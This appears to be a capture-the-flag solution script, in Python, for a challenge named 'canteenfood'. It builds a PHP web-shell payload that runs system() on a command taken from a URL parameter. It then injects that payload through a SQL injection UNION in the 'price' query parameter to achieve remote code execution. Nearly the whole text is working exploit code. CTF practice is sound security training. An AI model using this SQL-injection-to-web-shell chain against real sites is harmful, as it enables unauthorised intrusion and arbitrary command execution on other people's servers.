```python
import subprocess
import requests
import base64
```

```python
BASE_URL = 'https://df1e6cfcdc571b3af71da1aa-80-canteenfood.challenge.cscg.live:1337/'
PAYLOAD = 'echo("#####[START]#####" . system($_GET["cmd"]) . "#####[END]#####");'
```

```python
built_payload = subprocess.check_output(['php', 'payload-builder.php', PAYLOAD]).decode()
base64.b64decode(built_payload)
```

```python
# Inject payload using SQLI, which triggers the RCE appending
sqli_resp = requests.get(BASE_URL, params={'price': f" 5000 UNION ALL SELECT 0, 'test', '{built_payload}', 0"})
sqli_resp.status_code == 500
```
